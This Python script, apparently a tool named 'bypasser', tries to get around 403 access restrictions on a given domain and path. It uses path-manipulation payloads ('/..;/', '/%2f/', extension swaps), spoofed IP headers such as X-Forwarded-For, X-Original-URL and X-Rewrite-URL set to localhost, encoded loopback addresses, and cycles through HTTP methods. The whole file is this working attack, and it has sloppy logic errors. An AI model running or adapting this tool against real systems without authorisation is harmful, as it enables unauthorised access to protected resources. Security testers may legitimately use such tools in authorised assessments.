from email import header
from tracemalloc import stop
from urllib import response
import requests
import argparse
import sys
from color import *





class all:
    def all_test(args,path):
        list = ["//","///","/;/","/./","/.;/","/../","/.#/","//;//"]
        for i in list:
            url = "https://"+args+f"{i}"+path
            response = requests.request("GET", url)
            status_code = response.status_code
            size = len(response.content)
            print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[status:{str(status_code)}]"+Base.NC+Base.OKGREEN+f"[size:{size}]"+Base.NC)
            
    def slash_test(args,path):
        list = ["//","/.","/#","/*","/%2f/","?"]
        for i in list:
            url = "https://"+args+"/"+path+f"{i}"
            response = requests.request("GET", url)
            status_code = response.status_code
            size = len(response.content)
            print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[status:{str(status_code)}]"+Base.NC+Base.OKGREEN+f"[size:{size}]"+Base.NC)

    def slash_test_1(args,path):
        list = [".json",".html",".css",".js",".txt"]
        for i in list:
            regex = path.replace("/","")
            url = "https://"+args+"/"+regex+f"{i}"
            response = requests.request("GET", url)
            status_code = response.status_code
            size = len(response.content)
            print(Base.HEADER+url+Base.END+" "+Base.FAIL+f"[status:{str(status_code)}]"+Base.NC+Base.OKGREEN+f"[size:{size}]"+Base.NC)

    def  host_ip(args,path):
        list = ["localhost", "localhost","2130706433","3232235521","0","0177.0.0.1","localhost","localhost","3232235777","localtest.me","localhost", "127.0.0.1", "127.0.0.1", "127.0.0.1", "2130706433", "0x7F000001", "0177.0000.0000.0001", "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", "172.16.0.1", "192.168.1.0", "192.168.1.1"]
        print('\n')
        print(Base.OKBLUE+"Host Header Bypass"+Base.NC )
        print('\n')
        for i in list:
            url = "https://"+args+"/"+path
            header = {f"{i}":"127.0.0.1"}
            response = requests.request("POST", url, headers=header)
            status_code = response.status_code
            size = len(response.content)
            print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+"    "+Base.OKGREEN+f"[size:{size}]"+Base.NC )
    
    
    
    
    
    
    def post_based(args,path):
        list_header = ["X-Originating-IP","X-Forwarded-For","X-Forwarded","Forwarded-For","X-Remote-IP","X-Remote-Addr","X-ProxyUser-Ip","X-Original-URL","Client-IP","True-Client-IP","Cluster-Client-IP","X-ProxyUser-Ip","Host"]
        print('\n')
        print(Base.OKBLUE+"Header Test:"+Base.NC)
        print('\n')
        for i in list_header:
            if i != "Host":
                url = "https://"+args+"/"+path
                header = {f"{i}":"127.0.0.1"}
                response = requests.request("POST", url, headers=header)
                status_code = response.status_code
                size = len(response.content)
                print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+"    "+Base.OKGREEN+f"[size:{size}]"+Base.NC )
            else:
                url = "https://"+args+"/"+path
                header = {f"{i}":"localhost"}
                response = requests.request("POST", url, headers=header)
                status_code = response.status_code
                size = len(response.content)
                print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+"    "+Base.OKGREEN+f"[size:{size}]"+Base.NC )


    def method_based(args,path):
        list_method = ["HEAD","OPTIONS","GET","POST","PUT","TRACE","CONNECT","PATCH"]
        print('\n')
        print(Base.OKBLUE+"Method Test:"+Base.NC)
        print('\n')
        for i in list_method:
            url = "https://"+args+"/"+path
            response = requests.request(i, url)
            status_code = response.status_code
            size = len(response.content)
            print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+"    "+Base.OKGREEN+f"[size:{size}]"+Base.NC )
        
        
    def cros_header(args,path):
        list_method = ["HEAD","OPTIONS","GET","POST","PUT","TRACE","CONNECT","PATCH"]
        list_header = ["X-Originating-IP","X-Forwarded-For","X-Custom-IP-Authorization","X-Forwarded","Forwarded-For","X-Remote-IP","X-Remote-Addr","X-Real-IP","X-ProxyUser-Ip","X-Original-URL","Client-IP","X-Client-IP","True-Client-IP","Cluster-Client-IP","X-ProxyUser-Ip","Host"]
        print('\n')
        print(Base.OKBLUE+"Cross Test"+Base.NC )
        print('\n')
        for i in list_method:
            for a in list_header:
                if i != "Host":
                    url = "https://"+args+"/"+path
                    header = {f"{a}":"127.0.0.1"}
                    response = requests.request(i, url, headers=header)
                    status_code = response.status_code
                    size = len(response.content)
                    print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{i}"+" "+f"{a}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+Base.FAIL+f"[size:{size}]"+Base.NC)
                else:
                    url = "https://"+args+"/"+path
                    header = {f"{a}":"localhost"}
                    response = requests.request("POST", url, headers=header)
                    status_code = response.status_code
                    size = len(response.content)
                    print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{header}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+"    "+Base.OKGREEN+f"[size:{size}]"+Base.NC )
        
        
    def redirect_url_1(args,path):
        path = "/"+path
        print('\n')
        print(Base.OKBLUE+"Redirect Header Test"+Base.NC )
        print('\n')
        url = "https://"+args+"/"
        header = {"X-Original-URL":f"{path}"}
        response = requests.request("GET", url, headers=header)
        status_code = response.status_code
        size = len(response.content)
        print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{header}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+"    "+Base.OKGREEN+f"[size:{size}]"+Base.NC )


    def redirect_url_2(args,path):
        path = "/"+path
        url = "https://"+args+"/"
        header = {"X-Rewrite-URL":f"{path}"}
        response = requests.request("GET", url, headers=header)
        status_code = response.status_code
        size = len(response.content)
        print(Base.HEADER+url+Base.END+"    "+Base.OKGREEN+f"{header}"+Base.NC+"    "+Base.FAIL+f"[status:{str(status_code)}]"+"    "+Base.OKGREEN+f"[size:{size}]"+Base.NC )





def main(args,path):
    
    
    print('''
        █████                                                                      
        ░███                                                                       
        ░███████  █████ ████ ████████   ██████    █████   █████   ██████  ████████ 
        ░███░░███░░███ ░███ ░░███░░███ ░░░░░███  ███░░   ███░░   ███░░███░░███░░███
        ░███ ░███ ░███ ░███  ░███ ░███  ███████ ░░█████ ░░█████ ░███████  ░███ ░░░ 
        ░███ ░███ ░███ ░███  ░███ ░███ ███░░███  ░░░░███ ░░░░███░███░░░   ░███     
        ████████  ░░███████  ░███████ ░░████████ ██████  ██████ ░░██████  █████    
        ░░░░░░░░    ░░░███  ░ ███░░░   ░░░░░░░░ ░░░░░░  ░░░░░░   ░░░░░░  ░░░░░     
                ███    ███  ░ ███                                                  
                ░░████████   █████                                                 
                    ░░░░░░   ░░░░░  
          ''')
    
    print(Base.HEADER+f"Domain: {args}"+Base.END+"                "+Base.FAIL+f"Path: {path}"+Base.NC)
    print("\n")



while True:
    list = sys.argv
    domain = list[1]
    path = list[2]
    main(domain,path)
    
    all.all_test(domain,path)
    all.slash_test(domain,path)
    all.slash_test_1(domain,path)
    all.redirect_url_1(domain,path)
    all.redirect_url_2(domain,path)
    all.method_based(domain,path)
    all.post_based(domain,path)
    all.cros_header(domain,path)
    all.host_ip(domain,path)
    sys.exit()

